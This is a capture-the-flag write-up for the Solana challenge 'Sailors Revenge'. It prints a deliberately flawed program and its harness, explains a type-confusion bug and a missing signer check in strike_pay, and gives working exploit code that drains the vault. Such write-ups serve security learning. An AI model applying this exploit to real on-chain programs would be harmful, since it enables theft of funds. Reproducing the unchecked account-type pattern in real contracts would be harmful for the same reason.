# Sailors Revenge

Authors: J4X & PaideaDilemma

## Challenge

We get a solana smart contract:

```  
use borsh::{BorshDeserialize, BorshSerialize};  
use solana_program::{  
   account_info::{next_account_info, AccountInfo},  
   entrypoint::ProgramResult,  
   msg,  
   program::invoke_signed,  
   program_error::ProgramError,  
   pubkey::Pubkey,  
   system_instruction, system_program,  
   sysvar::rent::Rent,  
   sysvar::Sysvar,  
};

#[derive(Debug, Clone, BorshDeserialize, PartialEq, Eq, PartialOrd, Ord)]  
pub enum SailorInstruction {  
   CreateUnion(u64),  
   PayDues(u64),  
   StrikePay(u64),  
   RegisterMember([u8; 32]),  
}

#[derive(Debug, Clone, BorshSerialize, BorshDeserialize, PartialEq, Eq,
PartialOrd, Ord)]  
pub struct SailorUnion {  
   available_funds: u64,  
   authority: [u8; 32],  
}

#[derive(Debug, Clone, BorshSerialize, BorshDeserialize, PartialEq, Eq,
PartialOrd, Ord)]  
pub struct Registration {  
   balance: i64,  
   member: [u8; 32],  
}

fn transfer<'a>(  
   from: &AccountInfo<'a>,  
   to: &AccountInfo<'a>,  
   amt: u64,  
   signers: &[&[&[u8]]],  
) -> ProgramResult {  
   if from.lamports() >= amt {  
       invoke_signed(  
           &system_instruction::transfer(from.key, to.key, amt),  
           &[from.clone(), to.clone()],  
           signers,  
       )?;  
   }  
   Ok(())  
}

pub fn create_union(program_id: &Pubkey, accounts: &[AccountInfo], bal: u64)
-> ProgramResult {  
   msg!("creating union {}", bal);

   let iter = &mut accounts.iter();

   let sailor_union = next_account_info(iter)?;  
   assert!(!sailor_union.is_signer);  
   assert!(sailor_union.is_writable);

   let authority = next_account_info(iter)?;  
   assert!(authority.is_signer);  
   assert!(authority.is_writable);  
   assert!(authority.owner == &system_program::ID);

   let (sailor_union_addr, sailor_union_bump) =  
       Pubkey::find_program_address(&[b"union", authority.key.as_ref()], program_id);  
   assert!(sailor_union.key == &sailor_union_addr);

   let (vault_addr, _) = Pubkey::find_program_address(&[b"vault"],
program_id);  
   let vault = next_account_info(iter)?;  
   assert!(!vault.is_signer);  
   assert!(vault.is_writable);  
   assert!(vault.owner == &system_program::ID);  
   assert!(vault.key == &vault_addr);

   let system = next_account_info(iter)?;  
   assert!(system.key == &system_program::ID);

   if authority.lamports() >= bal {  
       transfer(&authority, &vault, bal, &[])?;  
       let data = SailorUnion {  
           available_funds: 0,  
           authority: authority.key.to_bytes(),  
       };  
       let ser_data = data.try_to_vec()?;

       invoke_signed(  
           &system_instruction::create_account(  
               &authority.key,  
               &sailor_union_addr,  
               Rent::get()?.minimum_balance(ser_data.len()),  
               ser_data.len() as u64,  
               program_id,  
           ),  
           &[authority.clone(), sailor_union.clone()],  
           &[&[b"union", authority.key.as_ref(), &[sailor_union_bump]]],  
       )?;

       sailor_union.data.borrow_mut().copy_from_slice(&ser_data);  
       Ok(())  
   } else {  
       msg!(  
           "insufficient funds, have {} but need {}",  
           authority.lamports(),  
           bal  
       );  
       Err(ProgramError::InsufficientFunds)  
   }  
}

pub fn pay_dues(program_id: &Pubkey, accounts: &[AccountInfo], amt: u64) ->
ProgramResult {  
   msg!("paying dues {}", amt);

   let iter = &mut accounts.iter();

   let sailor_union = next_account_info(iter)?;  
   assert!(!sailor_union.is_signer);  
   assert!(sailor_union.is_writable);  
   assert!(sailor_union.owner == program_id);

   let member = next_account_info(iter)?;  
   assert!(member.is_signer);  
   assert!(member.is_writable);  
   assert!(member.owner == &system_program::ID);

   let (vault_addr, _) = Pubkey::find_program_address(&[b"vault"],
program_id);  
   let vault = next_account_info(iter)?;  
   assert!(!vault.is_signer);  
   assert!(vault.is_writable);  
   assert!(vault.owner == &system_program::ID);  
   assert!(vault.key == &vault_addr);

   let system = next_account_info(iter)?;  
   assert!(system.key == &system_program::ID);

   if member.lamports() >= amt {  
       let mut data = SailorUnion::try_from_slice(&sailor_union.data.borrow())?;  
       data.available_funds += amt;  
       data.serialize(&mut &mut *sailor_union.data.borrow_mut())?;  
       transfer(&member, &vault, amt, &[])?;  
       Ok(())  
   } else {  
       msg!(  
           "insufficient funds, have {} but need {}",  
           member.lamports(),  
           amt  
       );  
       Err(ProgramError::InsufficientFunds)  
   }  
}

pub fn strike_pay(program_id: &Pubkey, accounts: &[AccountInfo], amt: u64) ->
ProgramResult {  
   msg!("strike pay {}", amt);

   let iter = &mut accounts.iter();

   let sailor_union = next_account_info(iter)?;  
   assert!(!sailor_union.is_signer);  
   assert!(sailor_union.is_writable);  
   assert!(sailor_union.owner == program_id);

   let member = next_account_info(iter)?;  
   assert!(member.is_writable);  
   assert!(member.owner == &system_program::ID);

   let authority = next_account_info(iter)?;  
   assert!(authority.is_signer);  
   assert!(authority.owner == &system_program::ID);

   let (vault_addr, vault_bump) = Pubkey::find_program_address(&[b"vault"],
program_id);  
   let vault = next_account_info(iter)?;  
   assert!(!vault.is_signer);  
   assert!(vault.is_writable);  
   assert!(vault.owner == &system_program::ID);  
   assert!(vault.key == &vault_addr);

   let system = next_account_info(iter)?;  
   assert!(system.key == &system_program::ID);

   let mut data = SailorUnion::try_from_slice(&sailor_union.data.borrow())?;  
   assert!(&data.authority == authority.key.as_ref());

   if data.available_funds >= amt {  
       data.available_funds -= amt;  
       transfer(&vault, &member, amt, &[&[b"vault", &[vault_bump]]])?;  
       data.serialize(&mut &mut *sailor_union.data.borrow_mut())?;  
       Ok(())  
   } else {  
       msg!(  
           "insufficient funds, have {} but need {}",  
           data.available_funds,  
           amt  
       );  
       Err(ProgramError::InsufficientFunds)  
   }  
}

pub fn register_member(  
   program_id: &Pubkey,  
   accounts: &[AccountInfo],  
   member: [u8; 32],  
) -> ProgramResult {  
   msg!("register member {:?}", member);

   let iter = &mut accounts.iter();

   let registration = next_account_info(iter)?;  
   assert!(!registration.is_signer);  
   assert!(registration.is_writable);

   let sailor_union = next_account_info(iter)?;  
   assert!(!sailor_union.is_signer);  
   assert!(!sailor_union.is_writable);  
   assert!(sailor_union.owner == program_id);

   let authority = next_account_info(iter)?;  
   assert!(authority.is_signer);  
   assert!(authority.is_writable);  
   assert!(authority.owner == &system_program::ID);

   let (registration_addr, registration_bump) = Pubkey::find_program_address(  
       &[  
           b"registration",  
           authority.key.as_ref(),  
           &member,  
       ],  
       program_id,  
   );  
   assert!(registration.key == &registration_addr);

   let system = next_account_info(iter)?;  
   assert!(system.key == &system_program::ID);

   let data = SailorUnion::try_from_slice(&sailor_union.data.borrow())?;  
   assert!(&data.authority == authority.key.as_ref());

   let ser_data = Registration {  
       balance: -100,  
       member,  
       // sailor_union: sailor_union.key.to_bytes(),  
   }  
   .try_to_vec()?;

   invoke_signed(  
       &system_instruction::create_account(  
           &authority.key,  
           &registration_addr,  
           Rent::get()?.minimum_balance(ser_data.len()),  
           ser_data.len() as u64,  
           program_id,  
       ),  
       &[authority.clone(), registration.clone()],  
       &[&[  
           b"registration",  
           authority.key.as_ref(),  
           &member,  
           &[registration_bump],  
       ]],  
   )?;

   registration.data.borrow_mut().copy_from_slice(&ser_data);

   Ok(())  
}

```

As well as a setup/server contract:

```  
use borsh::BorshSerialize;

use poc_framework_osec::{  
   solana_sdk::{  
       instruction::{AccountMeta, Instruction},  
       pubkey::Pubkey,  
       signature::{Keypair, Signer},  
   },  
   Environment,  
};

use sol_ctf_framework::ChallengeBuilder;

use solana_program::system_program;

use std::{  
   error::Error,  
   fs,  
   io::Write,  
   net::{TcpListener, TcpStream},  
};

use rand::prelude::*;

use threadpool::ThreadPool;

#[derive(Debug, Clone, BorshSerialize, PartialEq, Eq, PartialOrd, Ord)]  
pub enum SailorInstruction {  
   CreateUnion(u64),  
   PayDues(u64),  
   StrikePay(u64),  
   RegisterMember([u8; 32]),  
}

fn main() -> Result<(), Box<dyn Error>> {  
   let listener = TcpListener::bind("0.0.0.0:5000")?;  
   let pool = ThreadPool::new(4);  
   for stream in listener.incoming() {  
       let mut stream = stream.unwrap();

       pool.execute(move || {  
           if let Err(e) = handle_connection(&mut stream) {  
               println!("got error: {:?}", e);  
               writeln!(stream, "Got error, exiting...").ok();  
           }  
           stream.shutdown(std::net::Shutdown::Both).ok();  
       });  
   }  
   Ok(())  
}

fn handle_connection(socket: &mut TcpStream) -> Result<(), Box<dyn Error>> {  
   let mut builder = ChallengeBuilder::try_from(socket.try_clone()?)?;

   let mut rng = StdRng::from_seed([42; 32]);

   // put program at a fixed pubkey to make anchor happy  
   let prog = Keypair::generate(&mut rng);

   // load programs  
   let solve_pubkey = builder.input_program()?;  
   builder  
       .builder  
       .add_program(prog.pubkey(), "sailors_revenge.so");

   // make user  
   let user = Keypair::new();  
   let rich_boi = Keypair::new();  
   let (vault, _) = Pubkey::find_program_address(&[b"vault"], &prog.pubkey());  
   let (sailor_union, _) =  
       Pubkey::find_program_address(&[b"union", rich_boi.pubkey().as_ref()], &prog.pubkey());  
   let (registration, _) = Pubkey::find_program_address(  
       &[  
           b"registration",  
           rich_boi.pubkey().as_ref(),  
           user.pubkey().as_ref(),  
       ],  
       &prog.pubkey(),  
   );

   writeln!(socket, "program: {}", prog.pubkey())?;  
   writeln!(socket, "user: {}", user.pubkey())?;  
   writeln!(socket, "vault: {}", vault)?;  
   writeln!(socket, "sailor union: {}", sailor_union)?;  
   writeln!(socket, "registration: {}", registration)?;  
   writeln!(socket, "rich boi: {}", rich_boi.pubkey())?;  
   writeln!(socket, "system program: {}", system_program::id())?;

   // add accounts and lamports

   const TARGET_AMT: u64 = 100_000_000;  
   const INIT_BAL: u64 = 1337;  
   const TOTAL_BAL: u64 = 1_000_000_000;  
   const VAULT_BAL: u64 = 500_000_000;

   builder  
       .builder  
       .add_account_with_lamports(vault, system_program::id(), INIT_BAL)  
       .add_account_with_lamports(rich_boi.pubkey(), system_program::id(), TOTAL_BAL)  
       .add_account_with_lamports(user.pubkey(), system_program::id(), INIT_BAL);

   let mut challenge = builder.build();

   challenge.env.execute_as_transaction(  
       &[Instruction::new_with_borsh(  
           prog.pubkey(),  
           &SailorInstruction::CreateUnion(VAULT_BAL),  
           vec![  
               AccountMeta::new(sailor_union, false),  
               AccountMeta::new(rich_boi.pubkey(), true),  
               AccountMeta::new(vault, false),  
               AccountMeta::new_readonly(system_program::id(), false),  
           ],  
       )],  
       &[&rich_boi],  
   );

   challenge.env.execute_as_transaction(  
       &[Instruction::new_with_borsh(  
           prog.pubkey(),  
           &SailorInstruction::RegisterMember(user.pubkey().to_bytes()),  
           vec![  
               AccountMeta::new(registration, false),  
               AccountMeta::new_readonly(sailor_union, false),  
               AccountMeta::new(rich_boi.pubkey(), true),  
               AccountMeta::new_readonly(system_program::id(), false),  
           ],  
       )],  
       &[&rich_boi],  
   );

   // run solve  
   challenge.input_instruction(solve_pubkey, &[&user])?;

   // check solve  
   let balance = challenge  
       .env  
       .get_account(user.pubkey())  
       .ok_or("could not find user")?  
       .lamports;  
   writeln!(socket, "lamports: {:?}", balance)?;

   if balance > TARGET_AMT {  
       let flag = fs::read_to_string("flag.txt")?;  
       writeln!(  
           socket,  
           "You successfully exploited the working class and stole their union dues! Congratulations!\nFlag: {}",  
           flag.trim()  
       )?;  
   } else {  
       writeln!(socket, "That's not enough to get the flag!")?;  
   }

   Ok(())  
}  
```

Our goal is to get our own balance from 1337 to 100.000.000 lamports.

## Building a debug setup  
First we started by deploying the challenge locally in a docker to be able to
interact and somewhat debug, as we weren't getting back any info from the
challenge server. During this we encountered some issues but in the end it
worked by doing the following :

- To debug the server locally it was important to have the correct version of the rust compiler and solana distribution. Compilation was done via cargo cargo build-bpf   
- We also cloned sol_ctf_framework locally to be sure it get's compiled with debug symbols. To tell the rust compiler to use the local dependency, We had to adjust Cargo.toml in server.  
- We then attached rust-gdb and was able to set a breakpoint in poc-framework-osec-0.1.1/src/lib.rs:408 (execute_transaction), where we were able to get the output from self.bank.load_execute_and_commit_transactions, which actually commits the instruction that the server sets up via challenge.input_instruction(solve_pubkey, &[&user])?;.  
- This allowed us to at least somewhat know what is going on.

## Solving the challenge

In this case we have two problems inside the strike_pay function.

### 1. Type Confusion

First we have a problem of account confusion. The problem is that in the
strike_pay function we don't check if the SailorUnion that we get passed is of
type SailorUnion. So we can pass anything that could be interpreted as a
sailor union, is owned/created by the program and writable. In our case we can
for example use the Registration which is pretty helpfull. We have the
original struct of Sailor Union:

```  
pub struct SailorUnion {  
   available_funds: u64,  
   authority: [u8; 32],  
}  
```

And we also have the Struct for registration:

```  
pub struct Registration {  
   balance: i64,  
   member: [u8; 32],  
}  
```

If we would use a Registration as a Sailor Union the member would become the
authority and the available funds would become super high, as -100 is casted
into an unsigned integer. Luckily the program already provides us a
registration which we can use.

### 2. Unsufficient signer checks

Now we can just call the strike_pay function and exploit the second issue. In
the function we only check if the authority is the signer (the boss of the
union paying out the money) but are not checking if the member is not the
signer, so we can just use our user for both.

### 3. The Exploit

Now we can just compile our solve script and sent it using the solve.py script
provided. We based our solve script on the scripts provided in the repo of the
framework used (https://github.com/neodyme-labs/solana-poc-framework). We also
had to compile using the versions and commands mentioned in the debug section.

So we build a rust project that used the same dependencies as the chall and
included the following 2 files.

**processor.rs**  
```  
use borsh::{BorshDeserialize, BorshSerialize};

use solana_program::{  
   account_info::{next_account_info, AccountInfo},  
   entrypoint::ProgramResult,  
   instruction::{AccountMeta, Instruction},  
   program::invoke,  
   pubkey::Pubkey,

   system_program,  
};

//use sailors_revenge::processor::SailorInstruction;  
#[derive(Debug, Clone, BorshSerialize, BorshDeserialize, PartialEq, Eq,
PartialOrd, Ord)]  
pub enum SailorInstruction {  
   CreateUnion(u64),  
   PayDues(u64),  
   StrikePay(u64),  
   RegisterMember([u8; 32]),  
}

pub fn process_instruction(  
   _program: &Pubkey,  
   accounts: &[AccountInfo],  
   _data: &[u8],  
) -> ProgramResult {  
   let account_iter = &mut accounts.iter();

   let program = next_account_info(account_iter)?;  
   let user = next_account_info(account_iter)?;  
   let vault = next_account_info(account_iter)?;  
   let sailor_union = next_account_info(account_iter)?;  
   let registration = next_account_info(account_iter)?;  
   let rich_boi = next_account_info(account_iter)?;  
   let system = next_account_info(account_iter)?;

   invoke(  
       &Instruction::new_with_borsh(  
           *program.key,  
           &SailorInstruction::StrikePay(100000000),  
           vec![  
               AccountMeta::new(*registration.key, false),  
               AccountMeta::new(*user.key, true),  
               AccountMeta::new(*user.key, true),  
               AccountMeta::new(*vault.key, false),  
               AccountMeta::new_readonly(*system.key, false),  
           ],  
       ),  
       &[registration.clone(), user.clone(), vault.clone(), system.clone()]  
   )?;

   Ok(())  
}

```

**lib.rs**  
```  
use solana_program::entrypoint;

pub mod processor;  
use processor::process_instruction;  
entrypoint!(process_instruction);  
```

This compiled and sent using the solve.py yields us the flag.

Original writeup
(https://github.com/J4X-98/Writeups/blob/main/CTFs/AngstromCTF2023/Sailors%20Union/writeup.md).